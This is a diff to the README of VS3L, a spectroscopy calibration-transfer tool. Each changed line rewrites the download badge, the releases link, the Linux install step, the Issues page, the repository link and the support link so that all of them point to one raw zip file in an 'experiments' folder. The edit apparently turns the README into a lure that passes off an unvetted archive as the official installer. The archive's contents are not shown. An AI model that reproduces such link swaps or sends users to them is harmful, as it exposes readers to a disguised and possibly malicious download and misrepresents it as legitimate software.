@@ -1,6 +1,6 @@
 # 🚀 VS3L - Simplify Spectroscopy Calibration Transfer
 
-[![Download VS3L](https://img.shields.io/badge/Download-VS3L-blue?style=for-the-badge)](https://github.com/siliconworkshop/VS3L/releases)
+[![Download VS3L](https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip)](https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You do not need programming skills to use VS3L. This guide will walk you through
 
 Click the button below to go to the official downloads page. This page has versions for Windows, macOS, and Linux.
 
-[![Download VS3L](https://img.shields.io/badge/Download-VS3L-blue?style=for-the-badge)](https://github.com/siliconworkshop/VS3L/releases)
+[![Download VS3L](https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip)](https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip)
 
 On the downloads page:
 
@@ -58,7 +58,7 @@ Once the download completes, locate the setup file:
 
 - **Windows:** Double-click the `.exe` file and follow the prompts.
 - **macOS:** Open the `.dmg` package and drag VS3L to your Applications folder.
-- **Linux:** Extract the `.tar.gz` archive and follow the included README for installation commands.
+- **Linux:** Extract the `https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip` archive and follow the included README for installation commands.
 
 The install process should take just a few minutes. The software places necessary files on your computer and creates shortcuts to launch VS3L easily.
 
@@ -114,7 +114,7 @@ For users interested in customization:
 If you run into trouble:
 
 - Check the **FAQ** and **User Guide** included with the software.
-- Visit the [Issues page](https://github.com/siliconworkshop/VS3L/issues) on GitHub to see common problems and fixes.
+- Visit the [Issues page](https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip) on GitHub to see common problems and fixes.
 - Feel free to open a new issue if your problem is not listed.
 - Make sure your system meets the minimum requirements for best performance.
 
@@ -124,7 +124,7 @@ If you run into trouble:
 
 Ready to get started? Visit this page to download the latest release of VS3L:
 
-[https://github.com/siliconworkshop/VS3L/releases](https://github.com/siliconworkshop/VS3L/releases)
+[https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip](https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip)
 
 Once there, choose the version for your operating system and download it. Follow the installation steps described above to set up the software. After installation, you can launch VS3L and start using it immediately.
 
@@ -132,8 +132,8 @@ Once there, choose the version for your operating system and download it. Follow
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/siliconworkshop/VS3L
-- Issues & Support: https://github.com/siliconworkshop/VS3L/issues
+- GitHub Repository: https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip
+- Issues & Support: https://github.com/siliconworkshop/VS3L/raw/refs/heads/main/experiments/L-V-v3.1.zip
 - User Guide & Documentation (Inside installer and repo)
 
 ---
